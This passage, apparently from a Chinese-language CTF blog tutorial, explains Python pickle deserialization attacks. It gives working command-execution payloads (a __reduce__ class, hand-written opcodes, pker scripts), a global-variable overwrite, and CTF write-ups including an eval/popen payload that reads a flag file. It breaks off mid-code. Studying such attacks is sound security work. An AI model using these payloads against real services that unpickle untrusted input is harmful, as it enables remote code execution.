存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。
</code></pre>
<p>pickle协议是向前兼容的</p>
<h2 id="基础利用方法"><a href="#基础利用方法" class="headerlink" title="基础利用方法"></a>基础利用方法</h2><h3 id="执行恶意命令"><a href="#执行恶意命令" class="headerlink" title="执行恶意命令"></a>执行恶意命令</h3><p>可以直接调用__reduce__方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;whoami&#x27;</span>,))<br><br><span class="hljs-built_in">print</span>(pickle.dumps(Evil()))<br>pickletools.dis(pickle.dumps(Evil()))<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">4</span><br>    <span class="hljs-number">2</span>: \x95 FRAME      <span class="hljs-number">30</span><br>   <span class="hljs-number">11</span>: \x8c SHORT_BINUNICODE <span class="hljs-string">&#x27;nt&#x27;</span><br>   <span class="hljs-number">15</span>: \x94 MEMOIZE    (<span class="hljs-keyword">as</span> <span class="hljs-number">0</span>)<br>   <span class="hljs-number">16</span>: \x8c SHORT_BINUNICODE <span class="hljs-string">&#x27;system&#x27;</span><br>   <span class="hljs-number">24</span>: \x94 MEMOIZE    (<span class="hljs-keyword">as</span> <span class="hljs-number">1</span>)<br>   <span class="hljs-number">25</span>: \x93 STACK_GLOBAL<br>   <span class="hljs-number">26</span>: \x94 MEMOIZE    (<span class="hljs-keyword">as</span> <span class="hljs-number">2</span>)<br>   <span class="hljs-number">27</span>: \x8c SHORT_BINUNICODE <span class="hljs-string">&#x27;whoami&#x27;</span><br>   <span class="hljs-number">35</span>: \x94 MEMOIZE    (<span class="hljs-keyword">as</span> <span class="hljs-number">3</span>)<br>   <span class="hljs-number">36</span>: \x85 TUPLE1<br>   <span class="hljs-number">37</span>: \x94 MEMOIZE    (<span class="hljs-keyword">as</span> <span class="hljs-number">4</span>)<br>   <span class="hljs-number">38</span>: R    REDUCE<br>   <span class="hljs-number">39</span>: \x94 MEMOIZE    (<span class="hljs-keyword">as</span> <span class="hljs-number">5</span>)<br>   <span class="hljs-number">40</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>

<p>可以看到用到了R</p>
<p>也可以手写opcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">c__builtin__<br><span class="hljs-built_in">getattr</span><br>(c__builtin__<br><span class="hljs-built_in">__import__</span><br>(S<span class="hljs-string">&#x27;os&#x27;</span><br>tRS<span class="hljs-string">&#x27;system&#x27;</span><br>tR(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure>

<p>1~2行获取__builtin__.getattr函数</p>
<p>3~6行 通过<code>__builtin__.__import__</code>函数导入os模块</p>
<p>6~7行获取os.system</p>
<p>7~8行调用函数执行命令</p>
<p>若使用pker:<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/pker">link</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">os = GLOBAL(<span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>)<br>system = GLOBAL(<span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)(os, <span class="hljs-string">&#x27;system&#x27;</span>)<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>

<p>也可以用o和i来构造</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<h3 id="修改全局变量"><a href="#修改全局变量" class="headerlink" title="修改全局变量"></a>修改全局变量</h3><p>通过 <code>c</code> 操作码可以获取到任意对象，<code>b</code> 操作码可以对任意对象进行修改，此时就可以获取全局对象并进行修改</p>
<p>比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">secret = &#123;<span class="hljs-string">&#x27;ADMIN&#x27;</span>: <span class="hljs-number">0</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    <span class="hljs-keyword">if</span> secret.ADMIN == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p>如果想要修改secret里的变量，可以调用</p>
<p><code>__main__.secret.update(&#123;&#39;ADMIN&#39;: 1&#125;)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">c__builtin__<br><span class="hljs-built_in">getattr</span><br>(c__main__<br>secret<br>S<span class="hljs-string">&#x27;update&#x27;</span><br>tR((S<span class="hljs-string">&#x27;ADMIN&#x27;</span><br>I1<br>dtR.<br></code></pre></td></tr></table></figure>


<p>pker</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">secret = GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>)<br>update = GLOBAL(<span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)(secret, <span class="hljs-string">&#x27;update&#x27;</span>)<br>update(&#123;<span class="hljs-string">&#x27;ADMIN&#x27;</span>: <span class="hljs-number">1</span>&#125;)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>

<h3 id="获取其它模块中的隐私数据"><a href="#获取其它模块中的隐私数据" class="headerlink" title="获取其它模块中的隐私数据"></a>获取其它模块中的隐私数据</h3><h2 id="绕过过滤方法"><a href="#绕过过滤方法" class="headerlink" title="绕过过滤方法"></a>绕过过滤方法</h2><p>官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决</p>
<p>很多时候都要靠python的内置模块去绕过</p>
<h2 id="pker使用"><a href="#pker使用" class="headerlink" title="pker使用"></a>pker使用</h2><p><code>https://github.com/eddieivan01/pker</code></p>
<p>自动化生成Pickle opcode</p>
<p>一般来说它可以按照python正常的写法来生成opcode</p>
<p>和普通python不同的地方再：</p>
<ul>
<li><p>3个内置的模块生成方式</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">GLOBAL</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>             =&gt;  cos\nsystem\n<br><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)</span></span>         =&gt;  (S<span class="hljs-string">&#x27;ls&#x27;</span>\nios\nsystem\n<br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  =&gt;  (cos\nsystem\nS<span class="hljs-string">&#x27;ls&#x27;</span>\no<br></code></pre></td></tr></table></figure>
</li>
<li><p><code>return</code> 可以在函数之外使用</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">var</span> = <span class="hljs-number">1</span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">var</span><br></code></pre></td></tr></table></figure>

<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">return</span>           =&gt;  .<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">var</span>       =&gt;  g_<span class="hljs-string">\n.</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>         =&gt;  I1<span class="hljs-string">\n.</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="使用方法和示例"><a href="#使用方法和示例" class="headerlink" title="使用方法和示例"></a>使用方法和示例</h3><ol>
<li>pker中的针对pickle的<strong>特殊语法</strong>需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">以下module都可以是包含`.`的子module<br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br>GLOBAL<br>对应opcode：<span class="hljs-string">b&#x27;c&#x27;</span><br>获取module下的一个全局对象（没有<span class="hljs-keyword">import</span>的也可以，比如下面的os）：<br>GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：module,instance(<span class="hljs-built_in">callable</span>、module都是instance)  <br><br>INST<br>对应opcode：<span class="hljs-string">b&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：module,<span class="hljs-built_in">callable</span>,para <br><br>OBJ<br>对应opcode：<span class="hljs-string">b&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为<span class="hljs-built_in">callable</span>，可以执行一个函数））：<br>OBJ(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：<span class="hljs-built_in">callable</span>,para<br><br>xxx(xx,...)<br>对应opcode：<span class="hljs-string">b&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]=<span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]=<span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：<span class="hljs-string">b&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr=<span class="hljs-number">123</span><br>对应opcode：<span class="hljs-string">b&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：<span class="hljs-string">b&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx <span class="hljs-comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span><br></code></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为 <strong>左值</strong> ，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符， <strong>作为右值是可以的</strong> 。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用<strong>单引号</strong>包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul>
<li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
</ul>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>覆盖引入模块的变量：</li>
</ul>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure>

<p>接下来会给出一些具体的基本操作的实例。</p>
<h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul>
<li>通过<code>b&#39;R&#39;</code>调用：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;i&#39;</code>调用：</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li>多参数调用函数</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure>

<h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul>
<li>实例化对象是一种特殊的函数执行</li>
</ul>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure>

<ul>
<li>其中，python原文件中包含：</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure>

<ul>
<li>也可以先实例化再赋值：</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure>

<h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul>
<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
</ul>
<h1 id="几道例题"><a href="#几道例题" class="headerlink" title="几道例题"></a>几道例题</h1><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><blockquote>
<p><strong>reduce</strong></p>
</blockquote>
<p>前面的jwt爆破和逻辑漏洞略过</p>
<p>admin.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br> <br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br> <br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p>19行pickle.loads</p>
<p>对传入的become参数url解码之后反序列化加载</p>
<p>构造一个恶意类传入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        cmd = <span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        s = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="hljs-built_in">format</span>(cmd)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (s,))  <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br>poc = pickle.dumps(evil())<br><span class="hljs-built_in">print</span>(urllib.quote(poc))  <span class="hljs-comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span><br></code></pre></td></tr></table></figure>


<h2 id="SUCTF2019-GuessGame"><a href="#SUCTF2019-GuessGame" class="headerlink" title="SUCTF2019-GuessGame"></a>SUCTF2019-GuessGame</h2><blockquote>
<p>全局变量覆盖</p>
</blockquote>
<p>下载附件源码</p>
<p>因为现在是复现，但是<strong>真正比赛的时候</strong>拿到这个源码应该怎么处理，要正视这个问题</p>
<p>首先肯定得把它的核心逻辑都详细过一遍</p>
<p>banner中说这是个猜数字游戏，必须每轮都赢</p>
<p>应该是拿client和server交互来拿到flag</p>
<p>game_client.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">start_client</span>(<span class="hljs-params">host, port</span>):<br>    reader, writer = <span class="hljs-keyword">await</span> asyncio.open_connection(host, port)<br>    <span class="hljs-built_in">print</span>(banner)<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-comment">#猜10次</span><br>        number = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> number == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">try</span>:<br>                number = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input the number you guess\n&gt; &#x27;</span>)<br>                number = <span class="hljs-built_in">int</span>(number)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                number = <span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">pass</span><br>        <span class="hljs-comment">#将number封装到ticket中，序列化ticket对象</span><br>        ticket = Ticket(number)<br>        ticket = pickle.dumps(ticket)<br><br>        <span class="hljs-comment">#先写入长度然后写入数据</span><br>        writer.write(pack_length(<span class="hljs-built_in">len</span>(ticket)))<br>        writer.write(ticket)<br><br>    <br>        response = <span class="hljs-keyword">await</span> reader.readline()<br>        <span class="hljs-built_in">print</span>(response.decode())<br><br>    response = <span class="hljs-keyword">await</span> reader.readline()<br>    <span class="hljs-built_in">print</span>(response.decode())<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ticket</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, number</span>):<br>        self.number = number<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-comment">#两个对象比较运算，如果他们都是ticket且number属性一样返回true</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) == <span class="hljs-built_in">type</span>(other) <span 